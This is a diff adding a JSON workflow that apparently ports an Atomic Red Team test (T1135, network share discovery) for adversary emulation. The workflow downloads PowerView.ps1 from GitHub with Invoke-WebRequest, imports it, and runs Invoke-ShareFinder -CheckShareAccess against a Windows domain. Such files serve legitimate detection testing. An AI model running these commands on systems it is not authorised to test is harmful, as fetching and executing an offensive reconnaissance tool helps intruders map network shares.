@@ -1,0 +1,86 @@
+{
+  "id": "d07e4cc1-98ae-447e-9d31-36cb430d28c4",
+  "name": "PowerView ShareFinder",
+  "description": "PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "3730f852-260d-4b1d-b5ca-f43d24a933c1",
+      "type": "execute-command",
+      "data": {
+        "command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nInvoke-ShareFinder #{parameters}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0691e7e5-494b-4311-bdf2-aa54262540ab",
+      "name": "Check dependency 1/1",
+      "description": "Invoke-ShareFinder module must exist in %TEMP% directory",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "e2ee91b6-443d-480d-bd87-8c7cdf9b379a",
+      "name": "Resolve dependency 1/1",
+      "description": "Invoke-ShareFinder module must exist in %TEMP% directory",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "717cd7a2-9059-46e6-968c-6f06c5bb688c",
+      "name": "Re-check dependency 1/1",
+      "description": "Invoke-ShareFinder module must exist in %TEMP% directory",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "0691e7e5-494b-4311-bdf2-aa54262540ab",
+      "p": "on-success",
+      "o": "3730f852-260d-4b1d-b5ca-f43d24a933c1"
+    },
+    {
+      "s": "0691e7e5-494b-4311-bdf2-aa54262540ab",
+      "p": "on-failure",
+      "o": "e2ee91b6-443d-480d-bd87-8c7cdf9b379a"
+    },
+    {
+      "s": "e2ee91b6-443d-480d-bd87-8c7cdf9b379a",
+      "p": "on-success",
+      "o": "717cd7a2-9059-46e6-968c-6f06c5bb688c"
+    },
+    {
+      "s": "717cd7a2-9059-46e6-968c-6f06c5bb688c",
+      "p": "on-failure",
+      "o": "3730f852-260d-4b1d-b5ca-f43d24a933c1"
+    }
+  ],
+  "tags": [
+    "T1135",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "parameters",
+      "type": "string",
+      "description": "ShareFinder parameter",
+      "value": "-CheckShareAccess"
+    }
+  ]
+}
